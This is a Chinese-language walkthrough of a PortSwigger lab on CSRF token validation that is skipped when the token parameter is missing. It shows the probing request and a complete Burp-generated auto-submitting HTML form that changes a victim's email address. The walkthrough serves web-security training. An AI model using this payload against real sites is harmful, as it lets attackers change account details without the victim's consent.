# 实验：Token 验证依赖于 Token 是否存在的 CSRF 漏洞

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

本实验的邮箱修改功能易受 CSRF 攻击。

为了解决本实验，请使用你的漏洞利用服务器（exploit server）托管一个 HTML 页面，该页面利用 CSRF 攻击修改查看者的邮箱地址。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测
- 使用邮件修改功能
    ```http
    POST /my-account/change-email HTTP/2
    Cookie: session=6ENYxslyODP3hoLSQtwztirt0SRGKdbs

    email=a%40b&csrf=9zzH6C2LuCxcQa5YS5X3Z1uoNlRNMSDF
    ```
    - POST 请求体参数存在 csrf 令牌
- 尝试移除 POST csrf 参数值
    - 失败
- 尝试移除 POST csrf 参数本身
    - 成功


构造
- 使用 burp csrf poc 功能构造载荷
    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="a&#64;b" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    ```
    - 自动 POST 的顶级导航自动携带 cookie
    - 不包含 csrf 参数
